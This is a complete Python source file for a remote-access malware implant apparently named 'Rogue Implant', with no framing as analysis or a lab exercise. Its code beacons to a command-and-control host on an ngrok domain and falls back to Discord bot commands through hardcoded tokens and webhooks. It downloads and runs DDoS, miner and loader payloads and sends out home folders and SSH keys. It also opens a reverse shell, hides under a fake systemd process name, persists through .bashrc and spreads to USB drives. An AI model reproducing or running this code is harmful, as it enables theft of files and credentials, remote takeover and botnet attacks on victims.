#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading
from Cryptodome.Cipher import AES
import zipfile, tempfile, shutil, json
import urllib.parse
import ssl
import hashlib

# === Config ===
SECRET_KEY = b'6767BabyROGUE!&%5'
EXFIL_KEY = b'magicRogueSEE!333'
C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'  # No port in hostname
C2_PORT = 4444  # ngrok uses port 443
EXFIL_PORT = 9091
PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

# Implant unique identifier
IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
# Create consistent ID hash
IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]

# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"

# Create a custom SSL context to handle ngrok certificates
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def send_https_command(cmd):
    """Send command over HTTPS to C2"""
    url = f"https://{C2_HOST}/"
    encrypted_cmd = encrypt_response(cmd)
    
    try:
        req = urllib.request.Request(
            url,
            data=encrypted_cmd,
            headers={
                'Content-Type': 'application/octet-stream',
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            },
            method='POST'
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        encrypted_response = response.read()
        decrypted_response = decrypt_command(encrypted_response)
        return decrypted_response
    except Exception as e:
        error_msg = f"[!] Connection failed: {type(e).__name__}"
        if hasattr(e, 'reason'):
            error_msg += f" - {e.reason}"
        print(f"[DEBUG] Connection error: {e}")
        return error_msg

def fetch_payload(name):
    """Fetch payload from C2 server"""
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    
    try:
        print(f"[*] Fetching payload: {name} from {url}")
        
        # Create request with proper headers and SSL context
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            }
        )
        
        # Download the file with SSL context
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        
        # Write the file
        with open(dest, 'wb') as f:
            f.write(response.read())
        
        # Make it executable if it's a Python script
        if name.endswith('.py'):
            os.chmod(dest, 0o755)
            print(f"[+] Python payload saved and made executable: {dest}")
        else:
            print(f"[+] Payload saved: {dest}")
        
        return dest
        
    except Exception as e:
        print(f"[!] Failed to fetch payload {name}: {e}")
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        return subprocess.getoutput(f"python3 {path}")
    return f"[!] Payload {name} not found."

def zip_directory(path, zipf=None, base=""):
    if zipf is None:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        should_close = True
    else:
        should_close = False

    if os.path.isdir(path):
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.join(base, os.path.relpath(full_path, path))
                zipf.write(full_path, arcname)
    elif os.path.isfile(path):
        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))

    if should_close:
        zipf.close()
        return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if isinstance(path, list):
                for p in path:
                    zip_directory(p, zipf, base=os.path.basename(p))
            else:
                zip_directory(path, zipf)
        encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        return f"[!] Exfiltration failed: {e}"

def reverse_shell():
    try:
        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except:
        pass

def handle_trigger(cmd):
    if cmd.startswith("trigger_ddos"):
        # Download ddos.py first
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(cmd.split()[1:])
        if os.path.exists(path):
            return subprocess.getoutput(f"python3 {path} {args}")
        return "[!] ddos.py not found after download"

    elif cmd == "trigger_mine":
        # Download mine.py first
        fetch_payload("mine.py")
        return run_payload("mine.py")

    elif cmd == "trigger_stopmine":
        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")

    elif cmd.startswith("trigger_exfil"):
        # Extract path from command
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_exfil <path>"
        path = parts[1]
        return exfiltrate_data(path)

    elif cmd == "trigger_dumpcreds":
        targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/.ssh"),
        ]
        # Filter out non-existent directories
        existing_targets = [t for t in targets if os.path.exists(t)]
        if existing_targets:
            return exfiltrate_data(existing_targets)
        return "[!] No target directories found"

    elif cmd == "trigger_stealthinject":
        path = os.path.join(HIDDEN_DIR, "polyloader.py")
        if not os.path.exists(path):
            fetch_payload("polyloader.py")
        if os.path.exists(path):
            return subprocess.getoutput(f"python3 {path}")
        return "[!] polyloader.py not found"

    return None

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: load_payload <filename>"
        payload_name = parts[1]
        result = fetch_payload(payload_name)
        return f"[+] Fetched {payload_name}" if result else f"[!] Failed to fetch {payload_name}"
    
    elif cmd.startswith("run_payload"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: run_payload <filename>"
        return run_payload(parts[1])
    
    elif cmd.startswith("trigger_"):
        result = handle_trigger(cmd)
        return result if result else "[!] Trigger failed"
    
    elif cmd == "reverse_shell":
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"
    
    else:
        # Default command execution
        return subprocess.getoutput(cmd)

def beacon():
    """Main beacon loop using HTTPS"""
    print(f"[+] Starting HTTPS beacon to {C2_HOST}")
    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    beacon_count = 0
    identified = False
    bot_id = None
    
    while True:
        try:
            beacon_count += 1
            print(f"\n[BEACON #{beacon_count}] Checking in...")
            
            # Send beacon and check for commands
            response = send_https_command("beacon")
            print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
            
            # Check if response is a command to execute
            if response and response != "pong":
                if response.startswith("identified:"):
                    bot_id = response.replace("identified:", "", 1)
                    print(f"[+] C2 identified us as: {bot_id}")
                    identified = True
                else:
                    print(f"[+] Received command: {response}")
                    result = handle_command(response)
                    result_preview = result[:100] + "..." if len(result) > 100 else result
                    print(f"[+] Command result: {result_preview}")
                    
                    # Send result back
                    if result:
                        print(f"[+] Sending result to C2...")
                        result_response = send_https_command(f"result:{result}")
                        print(f"[+] C2 acknowledged: {result_response}")
            
            # If first beacon, send identification
            if not identified and beacon_count == 1:
                print(f"[+] Sending identification to C2...")
                id_response = send_https_command(f"identify:{IMPLANT_ID_HASH}")
                print(f"[+] C2 response: {id_response}")
            
            print(f"[.] Next beacon in 30 seconds...")
            time.sleep(30)  # Beacon interval
            
        except Exception as e:
            print(f"[!] Beacon error: {e}")
            print(f"[!] Retrying in 60 seconds...")
            time.sleep(60)

def check_discord_command():
    """Check Discord for commands"""
    try:
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        req = urllib.request.Request(DISCORD_COMMAND_URL, headers=headers)
        response = urllib.request.urlopen(req).read().decode()
        latest = json.loads(response)[0]["content"]
        return latest
    except Exception as e:
        return None

def send_to_webhook(content):
    """Send result to Discord webhook"""
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps({"content": content}).encode(),
            headers={"Content-Type": "application/json"},
            method='POST'
        )
        urllib.request.urlopen(req)
    except:
        pass

def discord_loop():
    """Discord fallback command loop"""
    print("[+] Discord beacon active")
    last_cmd = ""
    
    while True:
        try:
            cmd = check_discord_command()
            if cmd and cmd != last_cmd:
                print(f"[Discord] Received command: {cmd}")
                result = handle_command(cmd)
                encrypted_result = encrypt_response(result).decode()
                send_to_webhook(encrypted_result)
                last_cmd = cmd
        except Exception as e:
            pass
        
        time.sleep(30)

def fake_name():
    """Change process name for stealth"""
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
    except:
        pass

def setup_persistence():
    """Set up persistence via .bashrc"""
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    if not os.path.exists(target):
        shutil.copy(__file__, target)
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n# System maintenance\n(sleep 10 && python3 {target} 2>/dev/null &) &\n")
        os.chmod(target, 0o700)
        print(f"[+] Persistence installed: {target}")

def worm_propagate():
    """Worm propagation to removable drives"""
    try:
        # For Linux
        drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
        for mount in drives:
            if "/media" in mount or "/run/media" in mount:
                try:
                    worm_dir = os.path.join(mount.strip(), ".rogue_worm")
                    os.makedirs(worm_dir, exist_ok=True)
                    shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
                    print(f"[+] Worm propagated to: {worm_dir}")
                except:
                    pass
    except:
        pass

def p2p_listener():
    """P2P listener for bot communication"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    backup_ports = [7008, 7009, 7010, 7011]
    bound = False

    for port in backup_ports:
        try:
            sock.bind(('0.0.0.0', port))
            print(f"[♥] P2P listener bound to port {port}")
            bound = True
            break
        except OSError:
            continue

    if not bound:
        return

    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode() == "Rogue?":
                sock.sendto(b"I'm Rogue", addr)
        except:
            break

def p2p_broadcast():
    """P2P broadcast to find other bots"""
    ports = [7008, 7009, 7010, 7011]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    while True:
        for port in ports:
            try:
                sock.sendto(b"Rogue?", ('<broadcast>', port))
            except:
                continue
        time.sleep(60)

# === Launch ===
if __name__ == "__main__":
    print("[+] Rogue Implant starting...")
    print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
    print(f"[+] Payload Repo: {PAYLOAD_REPO}")
    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
    
    # Stealth and persistence
    fake_name()
    setup_persistence()
    worm_propagate()
    
    # Start threads
    threading.Thread(target=p2p_listener, daemon=True).start()
    threading.Thread(target=p2p_broadcast, daemon=True).start()
    threading.Thread(target=discord_loop, daemon=True).start()
    
    print("[+] All systems operational. Starting beacon...")
    
    # Start main HTTPS beacon (this will run in main thread)
    beacon()
